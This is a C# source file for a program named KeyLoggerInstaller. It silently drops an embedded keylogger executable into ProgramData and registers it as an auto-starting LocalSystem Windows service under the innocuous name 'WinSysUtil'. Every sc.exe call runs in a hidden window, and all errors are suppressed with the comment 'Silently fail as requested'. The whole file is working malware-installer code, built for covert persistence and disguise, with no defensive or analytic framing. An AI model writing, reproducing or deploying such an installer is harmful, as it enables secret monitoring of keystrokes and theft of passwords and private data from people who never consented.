using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.ServiceProcess;
using System.Threading.Tasks;

namespace KeyLoggerInstaller
{
    static class Program
    {
        private const string ServiceName = "WinSysUtil";
        private const string InstallDir = @"C:\ProgramData\WinSysUtil";
        private const string ExeName = "WinSysUtil.exe";
        private const string ConfigName = "WinSysUtil.exe.config";

        [STAThread]
        static void Main()
        {
            try
            {
                InstallAndStartService();
            }
            catch (Exception)
            {
                // Silently fail as requested
            }
        }

        static void InstallAndStartService()
        {
            // 1. Create installation directory
            if (!Directory.Exists(InstallDir))
            {
                Directory.CreateDirectory(InstallDir);
            }

            string exePath = Path.Combine(InstallDir, ExeName);
            string configPath = Path.Combine(InstallDir, ConfigName);

            // 2. Extract files from embedded resources
            ExtractResource("KeyLoggerService.exe", exePath);
            ExtractResource("KeyLoggerService.exe.config", configPath);

            // 3. Check if service exists
            if (ServiceExists(ServiceName))
            {
                StopAndRemoveService(ServiceName);
            }

            // 4. Install service using sc.exe
            // We use sc.exe because it's simpler than using ManagedInstallerClass in this context
            ProcessStartInfo scCreate = new ProcessStartInfo("sc.exe", $"create {ServiceName} binPath= \"{exePath}\" start= auto obj= LocalSystem");
            scCreate.WindowStyle = ProcessWindowStyle.Hidden;
            scCreate.CreateNoWindow = true;
            Process.Start(scCreate).WaitForExit();

            // 5. Start the service
            ProcessStartInfo scStart = new ProcessStartInfo("sc.exe", $"start {ServiceName}");
            scStart.WindowStyle = ProcessWindowStyle.Hidden;
            scStart.CreateNoWindow = true;
            Process.Start(scStart).WaitForExit();
        }

        static void ExtractResource(string resourceName, string outputPath)
        {
            var assembly = Assembly.GetExecutingAssembly();
            string fullResourceName = assembly.GetManifestResourceNames()
                .FirstOrDefault(r => r.EndsWith(resourceName));

            if (fullResourceName == null) return;

            using (Stream resourceStream = assembly.GetManifestResourceStream(fullResourceName))
            {
                if (resourceStream == null) return;
                using (FileStream fileStream = new FileStream(outputPath, FileMode.Create))
                {
                    resourceStream.CopyTo(fileStream);
                }
            }
        }

        static bool ServiceExists(string serviceName)
        {
            try {
                return ServiceController.GetServices().Any(s => s.ServiceName == serviceName);
            } catch { return false; }
        }

        static void StopAndRemoveService(string serviceName)
        {
            try
            {
                using (ServiceController sc = new ServiceController(serviceName))
                {
                    if (sc.Status != ServiceControllerStatus.Stopped && sc.Status != ServiceControllerStatus.StopPending)
                    {
                        sc.Stop();
                        sc.WaitForStatus(ServiceControllerStatus.Stopped, TimeSpan.FromSeconds(10));
                    }
                }
            }
            catch { }

            try {
                ProcessStartInfo scDelete = new ProcessStartInfo("sc.exe", $"delete {serviceName}");
                scDelete.WindowStyle = ProcessWindowStyle.Hidden;
                scDelete.CreateNoWindow = true;
                Process.Start(scDelete).WaitForExit();
            } catch { }
        }
    }
}
